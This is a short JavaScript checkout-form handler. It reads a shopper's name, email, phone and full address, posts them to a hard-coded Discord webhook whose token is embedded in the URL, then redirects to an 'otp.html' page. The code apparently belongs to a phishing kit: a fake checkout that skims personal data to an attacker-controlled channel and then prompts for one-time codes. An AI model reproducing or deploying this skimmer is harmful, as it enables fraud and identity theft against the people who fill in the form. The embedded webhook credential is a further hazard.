document.getElementById('checkout-form').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent the form from submitting the default way

    // Get form data
    const formData = new FormData(event.target);
    const data = {};
    formData.forEach((value, key) => {
        data[key] = value;
    });

    // Prepare data to send to the webhook
    const payload = {
        content: `Checkout Details:
        \nFull Name: ${data['full-name']}
        \nEmail Address: ${data['email']}
        \nPhone Number: ${data['phone']}
        \nAddress: ${data['address']}
        \nCity: ${data['city']}
        \nZIP Code: ${data['zip']}
        \nCountry: ${data['country']}`
    };

    // Send data to the webhook
    fetch('https://discord.com/api/webhooks/1268893038793719859/_ktjZVX-uHx8UVoYu7GAdrpkRLpbysF11nl120aBoWKRwdsY06g_9dAq1HYG7yeWvqwk', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (response.ok) {
            // Redirect to OTP page
            window.location.href = 'otp.html';
        } else {
            alert('There was a problem with the checkout process. Please try again.');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('There was an error processing your request. Please try again.');
    });
});